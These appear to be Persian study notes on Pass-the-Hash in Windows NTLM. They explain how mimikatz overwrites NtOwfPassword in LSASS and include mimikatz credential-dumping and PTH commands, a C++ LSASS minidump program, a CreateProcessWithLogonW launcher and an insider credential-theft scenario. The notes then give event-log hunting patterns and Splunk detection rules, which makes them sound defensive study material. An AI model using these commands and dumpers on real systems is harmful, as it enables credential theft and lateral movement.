


## 7. Pass-the-Hash — چطور msv1_0 را Bypass می‌کند؟

**منطق عادی:**
Password → Hash → مقایسه با SAM → OK


**منطق PTH:**
Hash (دزدیده‌شده) →
مستقیم به msv1_0 تزریق می‌شود → SAM چک نمی‌شود → OK


مهاجم با ابزارهایی مثل `mimikatz` یا `impacket`:

```
sekurlsa::pth /user:Administrator /domain:. /ntlm:<HASH>
```


این دستور یک پروسه جدید با **Token** جعلی باز می‌کند که msv1_0 آن را معتبر می‌شناسد — چون NTLM فقط هش را چک می‌کند، نه رمز اصلی.

---

## جریان کامل — یک نگاه

[Attacker dumps LSASS]
        ↓
    NTLM Hash
        ↓
[PTH Tool injects hash into msv1_0]
        ↓
[New process with stolen identity]
        ↓
[Lateral Movement via SMB/WMI/RDP]


## Pass-the-Hash — فرایند کامل

---

### پیش‌نیاز: NTLM Challenge-Response معمولی

قبل از PTH باید بدونی NTLM چطور کار می‌کنه:

Client                          Server
  │                               │
  │──── 1. Negotiate ────────────►│
  │                               │
  │◄─── 2. Challenge (8 bytes) ───│
  │                               │
  │  NT Hash = MD4(password)      │
  │  Response = HMAC-MD5(NT Hash, Challenge)
  │                               │
  │──── 3. Response ─────────────►│
  │                               │
  │         Server همین کار رو میکنه و مقایسه می‌کنه


رمز عبور هیچ‌وقت نمی‌ره روی شبکه — فقط **NT Hash** استفاده میشه.

---

### نتیجه مهم

> اگه NT Hash داشته باشی، رمز اصلی لازم نیست.

---

### PTH با mimikatz — مرحله به مرحله

---

#### مرحله ۱ — Hash به دست آوردن

mimikatz # sekurlsa::logonpasswords


از LSASS memory میخونه:

Username : Administrator
NT Hash  : aad3b435b51404eeaad3b435b51404ee


یا از SAM:

mimikatz # lsadump::sam


---

#### مرحله ۲ — ساختن Process معلق

mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:aad3b435...


داخلاً mimikatz این کار رو می‌کنه:

CreateProcessWithLogonW(
    user     = "Administrator",
    password = "FakePassword",       ← مهم نیست
    flags    = LOGON_NETCREDENTIALS_ONLY,
    ...
)
→ Process State: SUSPENDED


**چرا `LOGON_NETCREDENTIALS_ONLY`؟**
- رمز bogus هیچ‌وقت locally چک نمیشه
- فقط موقع network auth از credential استفاده میشه
- پس رمز اشتباه مشکلی ایجاد نمی‌کنه

---

#### مرحله ۳ — Inject کردن Hash به LSASS

LSASS Memory
└── LogonSessionList
    └── LogonSession (تازه ساخته شده)
        └── Credentials
            └── NtOwfPassword ← mimikatz اینجا رو overwrite می‌کنه
                               با NT Hash واقعی دزدیده‌شده


`NtOwfPassword` = NT One-Way Function = همون NT Hash

---

#### مرحله ۴ — Resume

ResumeThread → process شروع به اجرا می‌کنه


حالا هر بار که این process بخواد به یه سرویس شبکه‌ای وصل بشه:

Process → msv1_0 → "NT Hash چیه؟"
msv1_0  → LSASS  → NtOwfPassword = [هش inject‌شده]
msv1_0  → HMAC-MD5(هش inject‌شده, Challenge) → Response


از دید DC یه NTLM auth کاملاً معمولیه.

---

### تصویر کلی

مهاجم
  │
  ├─ Hash دزدیده‌شده دارد
  │
  ├─ mimikatz → CreateProcess (SUSPENDED)
  │
  ├─ mimikatz → LSASS را patch می‌کند
  │             NtOwfPassword = Hash دزدیده‌شده
  │
  ├─ ResumeThread
  │
  └─ Process با هویت قربانی روی شبکه عمل می‌کند
       │
       ▼
    \\TARGET\C$  ✓
    WMI          ✓
    SMB          ✓
    DCE/RPC      ✓


---

### چرا این کار می‌کنه؟

| سوال                     | جواب                            |
| ------------------------ | ------------------------------- |
| رمز اصلی لازمه؟          | نه، NTLM فقط hash چک می‌کنه     |
| LSASS چطور فریب می‌خوره؟ | مستقیم در memory patch میشه     |
| DC می‌فهمه؟              | نه، از دیدش auth معمولیه        |
| Kerberos هم آسیب‌پذیره؟  | نه، PTH فقط روی NTLM کار می‌کنه |

نمونه 

```c++
#include <windows.h>
#include <iostream>

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 4) {
        std::wcerr << L"Usage: " << argv[0] << L" <User> <Domain> <Password/Hash>" << std::endl;
        return 1;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    BOOL success = CreateProcessWithLogonW(argv[1],argv[2],argv[3],LOGON_NETCREDENTIALS_ONLY,L"C:\\Windows\\System32\\cmd.exe",NULL,0,NULL,NULL,&si,&pi);

    if (success) {
        std::cout << "[+] CMD spawned successfully (Mimikatz Style)!" << std::endl;
        std::cout << "[*] PID: " << pi.dwProcessId << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::cerr << "[-] Failed. Error: " << GetLastError() << std::endl;
    }

    return 0;
}
```


# Hunting 
---

## مبدأ (Source Machine)

وقتی mimikatz یه process با credential جدید می‌سازه:

**4624 روی مبدأ؟ — بستگی داره**

| حالت | لاگ |
|---|---|
| `LOGON_NETCREDENTIALS_ONLY` | **Logon Type 9** (NewCredentials) |
| بدون این flag | Logon Type 2 یا 3 |

پس روی مبدأ **4624 با Logon Type 9** داری، نه Type 3.

> Logon Type 9
>  یعنی: "locally همون token قبلیه، ولی یه credential جدید برای شبکه ثبت شد"

---

## مقصد (Target Machine)

اینجا NTLM challenge/response اتفاق می‌افته با hash تزریق‌شده:

- **4624 با Logon Type 3** (Network Logon)
- نه Type 9 — چون مقصد فقط یه network logon معمولی می‌بینه

---

## جمع‌بندی Hunt Pattern

Source:  Event 4624, Logon Type 9
              ↓
         Process creation (cmd.exe / powershell.exe)
         با SubjectLogonID متفاوت از NewLogonID
              ↓
Target:  Event 4624, Logon Type 3
         AuthenticationPackageName = NTLM


---

## نکته Hunt کلیدی

Logon Type 9 به خودی خود مشکوک نیست (runas /netonly هم همینه)، ولی این combo خیلی مشکوکه:

- Type 9 روی مبدأ
- بلافاصله یه network connection به ماشین دیگه
- process parent غیرعادی (مثلاً `sekurlsa` یا process های ناشناس)
- **WorkstationName یا IpAddress روی مقصد با مبدأ match کنه**


دقیقاً درست فکر می‌کنی، ولی یه تفکیک مهم هست.

---

## مبدأ (Source Machine)

وقتی mimikatz یه process با credential جدید می‌سازه:

**4624 روی مبدأ؟ — بستگی داره**

| حالت | لاگ |
|---|---|
| `LOGON_NETCREDENTIALS_ONLY` | **Logon Type 9** (NewCredentials) |
| بدون این flag | Logon Type 2 یا 3 |

پس روی مبدأ **4624 با Logon Type 9** داری، نه Type 3.

> Logon Type 9 یعنی: "locally همون token قبلیه، ولی یه credential جدید برای شبکه ثبت شد"

---

## مقصد (Target Machine)

اینجا NTLM challenge/response اتفاق می‌افته با hash تزریق‌شده:

- **4624 با Logon Type 3** (Network Logon)
- نه Type 9 — چون مقصد فقط یه network logon معمولی می‌بینه

---

## جمع‌بندی Hunt Pattern

Source:  Event 4624, Logon Type 9
              ↓
         Process creation (cmd.exe / powershell.exe)
         با SubjectLogonID متفاوت از NewLogonID
              ↓
Target:  Event 4624, Logon Type 3
         AuthenticationPackageName = NTLM


---

## نکته Hunt کلیدی

Logon Type 9 
به خودی خود مشکوک نیست (runas /netonly هم همینه)، ولی این combo خیلی مشکوکه:

- Type 9 روی مبدأ
- بلافاصله یه network connection به ماشین دیگه
- process parent غیرعادی (مثلاً `sekurlsa` یا process های ناشناس)
- **WorkstationName یا IpAddress روی مقصد با مبدأ match کنه**



----
----

یک سازمان رو تصور کنید که یک فرد جاسوس اونجا مسئول یه بخشی است و داخل سیستمش به دسترسی های سطح بالایی ندارد 
حالا اون فرد یه روز admin یا help desk یا کسی که دسترسی سطح بالایی داشته باشد رو صدا میکنه و ازش میخواد که با اطلاعاتش رو وارد کنه داخل سیستم جاسوس تا بتونه اون نرم افزاری که میخواد رو نصب کنه 
وقتی که admin اطلاعاتش رو در سیستم کاربر وارد میکنه نرم افزار نصب مشیه و میره یه اتفاقی می افته 
اطلاعاتش که شامل hash پسوردش میشه داخل حافظه lsass ذخیره میشه 

![[Pasted image 20260720062434.png]]

در این مرحله admin با token خودش یه cmd میاره بالا 

![[Pasted image 20260720062510.png]]


یک shell با سطح دسترسی admin داریم 


![[Pasted image 20260720062528.png]]


بعد از اون با استفاده از mimiaktz میایم اطلاعات رو میخونیم 

```
mimikatz # sekurlsa::logonpasswords
```

در حالت معمول، Mimikatz این مراحل را انجام می‌دهد:
- به Process مربوط به `lsass.exe` یک Handle باز می‌کند (`OpenProcess`).
- با داشتن دسترسی مناسب (معمولاً SeDebugPrivilege یا اجرای SYSTEM)، مستقیماً حافظه LSASS را می‌خواند.
- ساختارهای داخلی LSASS (مثل Logon Sessions و Credential Structures) را Parse می‌کند.

####  نمونه کد 


### Dump Process

```c++
#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>

 // Function to create a minidump of the specified process ID
void CreateMinidump(DWORD processId)
{
HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
if (processHandle == NULL)
{
    printf("Failed to open process. Error code: %u\n", GetLastError());
    return;
}

// Generate a unique file name for the minidump
char dumpFileName[MAX_PATH];
sprintf_s(dumpFileName, sizeof(dumpFileName), "Minidump_%u.dmp", processId);

// Create the minidump file
HANDLE dumpFile = CreateFileA(dumpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (dumpFile == INVALID_HANDLE_VALUE)
{
    printf("Failed to create minidump file. Error code: %u\n", GetLastError());
    CloseHandle(processHandle);
    return;
}

// Write the minidump
MINIDUMP_EXCEPTION_INFORMATION exceptionInfo;
exceptionInfo.ThreadId = GetCurrentThreadId();
exceptionInfo.ExceptionPointers = NULL;
exceptionInfo.ClientPointers = FALSE;

BOOL success = MiniDumpWriteDump(processHandle, processId, dumpFile, MiniDumpNormal, &exceptionInfo, NULL, NULL);
if (!success)
{
    printf("Failed to write minidump. Error code: %u\n", GetLastError());
}
else
{
    printf("Minidump created successfully: %s\n", dumpFileName);
}

// Cleanup
CloseHandle(dumpFile);
CloseHandle(processHandle);
}

int main()
{
// Get the process ID of the target process
DWORD targetProcessId = 13940;

// Create the minidump
CreateMinidump(targetProcessId);

return 0;
}

```



---
----


![[Pasted image 20260720070300.png]]



- SAM
اطلاعات مربوط به NTLM ذخیره میشه 


- SECURTIY

اطلاعات مربوط به Kerberos ذخیره میشه 



کاری که خلاصه mimikatz میره انجام میده 
اینه که میره hash رو به جای پسورد به پروسه lsass تزریق میکنه 



![[Pasted image 20260720073240.png]]



این جمله:

> «داخل `LOGON_NETCREDENTIALS_ONLY`، msv1_0 اهمیت نمی‌دهد به credential.»

کمی گمراه‌کننده است.

اتفاقی که واقعاً می‌افتد این است:

- `CreateProcessWithLogonW(..., LOGON_NETCREDENTIALS_ONLY, ...)`  
    **اعتبار رمز را Verify نمی‌کند.**
    
- LSA یک **Logon Session جدید** ایجاد می‌کند.
    
- Credentialهایی که دادی به عنوان **Network Credentials** داخل آن Session ذخیره می‌شوند، اما **Authenticate نمی‌شوند**.
    

یعنی Password اصلاً چک نشده است.

---

# حالا سؤال اصلی

> وقتی Process ساخته شد و Mimikatz Hash را Inject می‌کند، دقیقاً چه اتفاقی می‌افتد؟

بیاییم مرحله به مرحله داخل LSASS برویم.

---

## مرحله ۱

فرض کن این دستور اجرا می‌شود:

```text
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<HASH>
```

Mimikatz اول این را صدا می‌زند:

```cpp
CreateProcessWithLogonW(
    L"Administrator",
    L"CORP",
    L"FakePassword",
    LOGON_NETCREDENTIALS_ONLY,
    ...
);
```

نتیجه؟

داخل LSASS یک **Logon Session** جدید ساخته می‌شود.

به صورت مفهومی:

```
LSASS

AuthenticationId = 0x5A12

User = Administrator

Credential

Password = FakePassword
NT Hash = ؟
```

هنوز هیچ Authentication انجام نشده است.

---

# مرحله ۲

اینجا بخش مهم شروع می‌شود.

Mimikatz با داشتن SeDebugPrivilege وارد حافظه LSASS می‌شود.

بعد باید Session جدید را پیدا کند.

چطور؟

از طریق:

```
AuthenticationId (LUID)
```

یا همان Logon Session ID.

---

داخل LSASS چیزی شبیه این وجود دارد:

```
LogonSessionList

↓

Session A

↓

Session B

↓

Session C   ← همین Process جدید
```

---

# مرحله ۳

حالا Mimikatz Provider مربوط به NTLM یعنی

```
msv1_0
```

را پیدا می‌کند.

داخل msv1_0 ساختارهایی وجود دارد که Credentialهای NTLM را نگه می‌دارند.

به صورت مفهومی:

```
MSV1_0_PRIMARY_CREDENTIAL

Username

Domain

NtOwfPassword

LmOwfPassword

SHAHash
```

همان فیلدی که ما به آن علاقه داریم:

```
NtOwfPassword
```

---

# مرحله ۴

اینجا اتفاق اصلی رخ می‌دهد.

فرض کن قبل از Patch:

```
NtOwfPassword

↓

000000000000000000000000
```

یا Hash مربوط به Password جعلی.

Mimikatz این حافظه را Overwrite می‌کند.

```
قبل

NtOwfPassword

↓

11 22 33 44 ...
```

بعد

```
NtOwfPassword

↓

AA BB CC DD ...
```

که همان NT Hash دزدیده‌شده است.

---

# سؤال مهم

پس Password جعلی چه می‌شود؟

تقریباً هیچ استفاده‌ای از آن نمی‌شود.

چون هنگام Authentication شبکه، msv1_0 دیگر Password را نمی‌خواند.

بلکه می‌گوید:

```
Credential من چیست؟

↓

NtOwfPassword
```

و آن مقدار الان Hash دزدیده‌شده است.

---

# مرحله ۵

بعد از

```
ResumeThread()
```

Process اجرا می‌شود.

حالا فرض کن داخل cmd می‌زنی:

```
dir \\DC01\C$
```

Windows این مسیر را طی می‌کند:

```
cmd.exe

↓

SMB Redirector

↓

SSPI

↓

NTLM SSP

↓

msv1_0

↓

Credential
```

---

msv1_0 می‌گوید:

```
Hash من چیست؟
```

LSASS جواب می‌دهد:

```
NtOwfPassword

=

AA BB CC DD
```

همان Hash تزریق‌شده.

---

بعد Challenge می‌رسد.

```
Server

↓

Challenge
```

msv1_0 محاسبه می‌کند:

```
NTLMv2 Response

=

HMAC-MD5(
    NtOwfPassword,
    Challenge,
    Blob
)
```

بدون اینکه Password واقعی را بداند.

---

# نکته‌ای که معمولاً اشتباه فهمیده می‌شود

خیلی‌ها فکر می‌کنند Mimikatz هنگام PTH این کار را می‌کند:

```
Password

↓

Hash

↓

جایگزین Password
```

نه.

Password اصلاً دیگر مهم نیست.

چیزی که عوض می‌شود **Credential Cache داخل LSASS** است.

به بیان دقیق‌تر:

```
Logon Session

↓

MSV Credential

↓

NtOwfPassword
```

نه خود Password.

---

## جمع‌بندی

از دید معماری ویندوز، `LOGON_NETCREDENTIALS_ONLY` فقط یک **Logon Session معتبر** و یک Process با Token مناسب ایجاد می‌کند، بدون اینکه اعتبار رمز بررسی شود. Mimikatz از این فرصت استفاده می‌کند تا **فیلد `NtOwfPassword` در ساختار Credential مربوط به همان Session را با NT Hash سرقت‌شده جایگزین کند**. از آن لحظه به بعد، هر بار که آن Process از NTLM برای احراز هویت شبکه استفاده کند، `msv1_0` به جای هشِ مشتق‌شده از Password جعلی، همان Hash تزریق‌شده را برای تولید پاسخ Challenge-Response به کار می‌برد. به همین دلیل از دید سرور مقصد، یک احراز هویت NTLM کاملاً عادی اتفاق افتاده است.

این هم دلیل اصلی موفقیت Pass-the-Hash است: **در NTLM، اثبات هویت بر پایه‌ی داشتن NT Hash است، نه دانستن Password اصلی.**



### Hunting & Detection


##### Reference

https://threathunterplaybook.com/library/windows/mimikatz_openprocess_modules.html

![[mimikatz_OpenProcess.pdf]]



زمانی که با ابزار هایی ماننده CrackMapExec یا ابزار های مشابه میایم و به یه سیستم  لاگین میکنیم فیلدی که تو EventCode 4624 می بینیم به صورت Anonymous هستش


![[Pasted image 20260721033910.png]]


![[Pasted image 20260721033922.png]]

یعنی باید دنبال LogonType 3 باشیم که فیلد Account_Name برابر باشه با Anonymous 

بعدش باید دنبال LogonType  مثله 4672 باشیم که چه دسترسی هایی داره 

یعنی باید دنبال یه logonID باشیم که EventCode 4624 داشته باشه 4672 داشته داشته باشه 



---
---


- Event ID 4624
    
- LogonType=9 روی Source (NewCredentials)
    
- بلافاصله بعدش LogonType=3 روی Target
    
- AuthenticationPackage=NTLM
    
- Anonymous Logon (برای CME/Impacket)
    
- Event 4672 روی همون LogonID
    
- فاصله زمانی خیلی کم
    
- ارتباط بین Source و Target از طریق Logon ID یا IP
    

---

# Rule شماره ۱ (Behavioral Pass-the-Hash)

این Rule مورد علاقه من برای Splunk هست.

```spl
index=windows (EventCode=4624 OR EventCode=4672)

| eval LogonType=coalesce(Logon_Type,LogonType)

| eval Account=coalesce(Account_Name,TargetUserName)

| eval AuthPkg=coalesce(Authentication_Package,AuthenticationPackageName)

| transaction Logon_ID maxspan=30s

| search EventCode=4624 EventCode=4672

| search LogonType=3

| search AuthPkg="NTLM"

| table _time host Workstation_Name Source_Network_Address Account Logon_ID EventCode PrivilegeList
```

این Rule دنبال Network Logon هایی میگرده که بعدش Privileged Logon اتفاق افتاده باشه.

---

# Rule شماره ۲ (CME / Impacket Detection)

از چیزی که آخر فایل نوشتی.

```spl
index=windows EventCode=4624

Logon_Type=3

AuthenticationPackageName=NTLM

Account_Name="ANONYMOUS LOGON"

| stats
count
values(host) as Target
values(Source_Network_Address) as SourceIP
values(Workstation_Name) as Workstation
by Logon_ID

| where count>=1
```

این Rule برای CME خیلی خوب جواب میده.

---

# Rule شماره ۳ (Pass-the-Hash High Fidelity)

این یکی برای Production مناسب‌تره.

```spl
index=windows (EventCode=4624 OR EventCode=4672)

| eval LogonType=coalesce(Logon_Type,LogonType)

| eval Auth=coalesce(AuthenticationPackageName,Authentication_Package)

| eval User=coalesce(Account_Name,TargetUserName)

| bin _time span=1m

| stats
values(EventCode) as Events
values(PrivilegeList) as Privileges
values(host) as Hosts
values(Source_Network_Address) as SourceIP
values(Workstation_Name) as Workstation
count
by _time Logon_ID User LogonType Auth

| where mvfind(Events,"4672")>=0

| where mvfind(Events,"4624")>=0

| where LogonType=3

| where Auth="NTLM"

| eval Severity="High"

| eval Technique="Pass-the-Hash"

| eval MITRE="T1550.002"

| table _time User SourceIP Workstation Hosts Severity Technique MITRE
```

---

# Rule شماره ۴ (Source + Target Correlation)

این همون چیزیه که اکثر SIEMها ندارن.

```
Source
4624
LogonType=9
        │
        │ کمتر از ۳۰ ثانیه
        ▼
Target
4624
LogonType=3
AuthenticationPackage=NTLM
        │
        ▼
4672
```

SPL:

```spl
index=windows (EventCode=4624 OR EventCode=4672)

| eval LogonType=coalesce(Logon_Type,LogonType)

| transaction Source_Network_Address maxspan=30s

| search EventCode=4624 EventCode=4672

| search AuthenticationPackageName=NTLM

| eval HasType9=if(match(_raw,"Logon Type:\\s+9"),1,0)

| eval HasType3=if(match(_raw,"Logon Type:\\s+3"),1,0)

| stats
max(HasType9) as Type9
max(HasType3) as Type3
values(host) as Hosts
values(Account_Name) as Users
values(EventCode) as Events
by Source_Network_Address

| where Type9=1 AND Type3=1
```

این Rule دقیقاً سناریوی Pass-the-Hash با `LOGON_NETCREDENTIALS_ONLY` را دنبال می‌کند.

---

## Rule شماره ۵ (Enterprise Grade)

اگر من قرار بود این Rule را برای SOC یک بانک بنویسم، اصلاً روی EventID تنها تکیه نمی‌کردم. من این شرایط را همزمان می‌گذاشتم:

- ✅ Event 4624
    
- ✅ Logon Type = 3
    
- ✅ AuthenticationPackage = NTLM
    
- ✅ Event 4672 روی همان LogonID
    
- ✅ کمتر از ۳۰ ثانیه اختلاف زمانی
    
- ✅ Source اولین بار به آن سرور وصل شده باشد
    
- ✅ Account عضو Domain Admins یا Administrators باشد
    
- ✅ Parent Process غیرعادی (اگر Sysmon داری: `cmd.exe`، `powershell.exe`، `wmic.exe`، `psexecsvc.exe`، `rundll32.exe`)
    
- ✅ بعد از آن Event 5140 (دسترسی به `ADMIN$` یا `C$`) یا ایجاد سرویس (7045) یا اجرای Process از راه دور (Sysmon Event ID 1)
    
